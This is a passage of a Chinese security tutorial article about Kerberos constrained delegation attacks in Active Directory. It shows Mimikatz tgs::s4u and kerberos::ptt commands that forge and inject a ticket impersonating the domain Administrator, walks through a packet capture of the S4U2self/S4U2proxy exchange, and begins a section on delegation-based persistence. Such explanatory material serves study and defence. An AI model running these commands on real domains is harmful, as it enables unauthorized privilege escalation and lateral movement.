rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0); white-space: normal; "><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">tgs</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">::</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">s4u </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">tgt</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:[</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">0</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">3e7</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">]-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">2</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">1</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">40e00000</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">PC</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">JACK</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">0DAY</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">$@krbtgt</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">0DAY</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ORG</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">kirbi </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">user</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Administrator@0day</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">org </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">service</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">cifs</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">OWA2010SP3</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">0day</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">org</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.361603700848111" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/57_YRZqiaL0MdotupQKzfSc8YjnaAqEpw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaI2m3uFdLMGJ7Smk4hnHYXl4gSibYRZqiaL0MdotupQKzfSc8YjnaAqEpw/640?wx_fmt=png'" data-type="png" data-w="1297" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><section class="code-snippet__github" style=" margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0); white-space: normal; "><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">kerberos</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">::</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ptt TGS_Administrator@0day</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">org@0DAY</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ORG_cifs</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">~</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">OWA2010SP3</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">0day</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">org@0DAY</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ORG</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">kirbi</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.429097605893186" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/58_fKBNofSfzeNuz4hG47Nicv7ZlyHVtA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIVrdzQenuib92TseoPA2DLEsgZicfKBNofSfzeNuz4hG47Nicv7ZlyHVtA/640?wx_fmt=png'" data-type="png" data-w="1086" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br  /></p><h2 style="margin: 4em auto 2em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: center;color: rgb(255, 255, 255);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.2em;font-weight: bold;display: table;padding-right: 0.2em;padding-left: 0.2em;background: rgb(15, 76, 129);">抓包分析约束性委派攻击过程</h2><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br style="-webkit-tap-highlight-color: transparent;"  />这里可以看到有6个请求<br style="-webkit-tap-highlight-color: transparent;"  /></p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.2510176390773406" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/59_OicZqEHKwvcJvKPlKFdsEcoppPBbZQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIUeiaAjDH2l5uu8H5m6ibY5iabSt1OicZqEHKwvcJvKPlKFdsEcoppPBbZQ/640?wx_fmt=png'" data-type="png" data-w="737" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br  /></p><h3 style="margin-top: 2em;margin-right: 8px;margin-bottom: 0.75em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.2;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.1em;font-weight: bold;padding-left: 8px;border-left: 3px solid rgb(15, 76, 129);">1.AS-REQ</h3><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br style="-webkit-tap-highlight-color: transparent;"  />可以看到用户PC-JACK-0DAY用户向KDC请求一张TGT<br style="-webkit-tap-highlight-color: transparent;"  /></p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.5929095354523227" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/60_3Q67bM8DddO13GTiaz47tPPjOJg1zQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIlQJlkqT9TicqWkvhgXzk3oKHks3Q67bM8DddO13GTiaz47tPPjOJg1zQ/640?wx_fmt=png'" data-type="png" data-w="818" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br  /></p><h3 style="margin-top: 2em;margin-right: 8px;margin-bottom: 0.75em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.2;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.1em;font-weight: bold;padding-left: 8px;border-left: 3px solid rgb(15, 76, 129);">2.AS-REP</h3><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br style="-webkit-tap-highlight-color: transparent;"  />返回一张TGT，这张TGT代表的就是PC-JACK-0DAY这个用户<br style="-webkit-tap-highlight-color: transparent;"  /><br style="-webkit-tap-highlight-color: transparent;"  /></p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.6206896551724138" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/61_EIZX1BicrWo2pJGoUuYb2EQl7msKbw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIOWEqSfuD9FYOPPMBnet2SDPn0EIZX1BicrWo2pJGoUuYb2EQl7msKbw/640?wx_fmt=png'" data-type="png" data-w="841" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br  /></p><h3 style="margin-top: 2em;margin-right: 8px;margin-bottom: 0.75em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.2;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.1em;font-weight: bold;padding-left: 8px;border-left: 3px solid rgb(15, 76, 129);">3.第一次的TGS-REQ和TGS-REP</h3><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br style="-webkit-tap-highlight-color: transparent;"  />用这张<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">TGT</code>发送<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">S4U2self</code>请求，以<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">Administrator</code>的名义向<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">TGS</code>申请了一张访问自身服务的票据，ST1</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.49166666666666664" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/62_a0b6Z698UeLVSn5K05rMlDTukyUibg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIwfuBMrHg6vdL5oxu2Aqu2SNR8ia0b6Z698UeLVSn5K05rMlDTukyUibg/640?wx_fmt=png'" data-type="png" data-w="1320" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br  /></p><h3 style="margin-top: 2em;margin-right: 8px;margin-bottom: 0.75em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.2;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.1em;font-weight: bold;padding-left: 8px;border-left: 3px solid rgb(15, 76, 129);">4.第二次的TGS-REQ和TGS-REP</h3><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br style="-webkit-tap-highlight-color: transparent;"  />得到<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">ST1</code>之后，然后会带上ST1再次向<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">KDC</code>发起<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">SU42Proxy</code>请求，以<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">administrator</code>的名义请求一张访问<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">OWA2010SP3 cifs</code>服务的票据，ST2<br style="-webkit-tap-highlight-color: transparent;"  /></p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.45839874411302983" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/63_e09EcbDaiblEYla59EIHIUf8VGxkBg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIfIB4AL9p8rD4UHLHBELMicickV7e09EcbDaiblEYla59EIHIUf8VGxkBg/640?wx_fmt=png'" data-type="png" data-w="1274" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br  /></p><h2 style="margin: 4em auto 2em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: center;color: rgb(255, 255, 255);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.2em;font-weight: bold;display: table;padding-right: 0.2em;padding-left: 0.2em;background: rgb(15, 76, 129);">利用约束性委派进行权限维持</h2><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br style="-webkit-tap-highlight-color: transparent;"  />我们都知道TGT的生成是由<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">krbtgt</code>用户加密和签名的，如果我们能委派域上的用户去访问<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">TGS</code>，那么就可以伪造任意用户的TGT了，黄金票据通常情况下我们是用<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">krbtgt</code>的hash来伪造TGT，不过我们通过约束委派也能达到同样的效果。<br style="-webkit-tap-highlight-color: transparent;"  /></p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><strong style="-webkit-tap-highlight-color: transparent;color: rgb(15, 76, 129);line-height: 1.75;">注</strong>：<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, 